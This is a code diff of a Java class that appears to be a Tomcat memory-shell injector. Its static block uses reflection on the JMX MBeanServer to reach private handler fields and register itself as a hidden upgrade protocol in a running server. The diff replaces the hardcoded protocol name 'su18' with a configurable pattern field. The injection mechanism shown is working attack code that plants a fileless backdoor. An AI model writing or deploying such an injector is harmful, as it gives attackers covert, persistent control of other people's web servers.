@@ -21,14 +21,13 @@ import java.util.HashMap;
  */
 public class TUGMSFromJMX implements UpgradeProtocol {
 
+	public static String pattern;
+
 	public TUGMSFromJMX() {
 	}
 
 	static {
 		try {
-
-			String upgradeProtocol = "su18";
-
 			MBeanServer mbeanServer = Registry.getRegistry(null, null).getMBeanServer();
 			Field       field       = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
 			field.setAccessible(true);
@@ -62,7 +61,7 @@ public class TUGMSFromJMX implements UpgradeProtocol {
 					upgradeProtocolsField.setAccessible(true);
 					HashMap<String, UpgradeProtocol> upgradeProtocols = (HashMap<String, UpgradeProtocol>) upgradeProtocolsField.get(handler);
 
-					upgradeProtocols.put(upgradeProtocol, new TUGMSFromJMX());
+					upgradeProtocols.put(pattern.substring(1), new TUGMSFromJMX());
 					upgradeProtocolsField.set(handler, upgradeProtocols);
 					break;
 				}
